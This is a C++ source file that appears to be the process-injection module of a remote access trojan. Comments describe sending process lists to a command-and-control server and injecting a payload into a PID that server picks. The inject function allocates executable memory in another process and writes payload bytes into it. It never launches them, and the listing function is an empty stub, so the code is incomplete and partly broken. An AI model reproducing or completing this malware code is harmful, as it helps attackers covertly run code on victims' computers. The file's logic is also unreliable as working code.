// Patrick Sacchet
// Version 1.0
// RAT-Exe-Injection.cpp : This file contains functionality for injecting into a target process

#include "RAT-Exe-Injection.h"

// parse through all processes and send them back to our C2
INT parseProcesses(__inout char*** procs, __inout char** procPIDs, __inout INT* numProcs)
{
	INT status = ERROR_SUCCESS;










cleanup:
	return status;
}







// take PID from C2 to inject into 
INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
{
	INT status = ERROR_SUCCESS;
	CHAR messageBuffer [MAX_BUFFER_SIZE];
	LPVOID baseAddress = NULL;
	HANDLE hProcess;
	UINT64 numBytesWritten = 0;


	sprintf_s(messageBuffer, "RAT-Exe-Inject::inject - Injecting into process %d\n", PID);
	OutputDebugStringA(messageBuffer);

	hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, PID);
	if (hProcess == NULL)
	{
		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to open handle to target process!\n");
		goto cleanup;
	}

	// allocate memory in target process
	baseAddress = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (baseAddress == NULL)
	{
		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to allocate memory in target process!\n");
		goto cleanup;
	}

	status = WriteProcessMemory(hProcess, baseAddress, payloadBytes, payloadSize, &numBytesWritten);
	if (status == 0)
	{
		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to write payload into target process!\n");
		goto cleanup;
	}





cleanup:
	return status;
}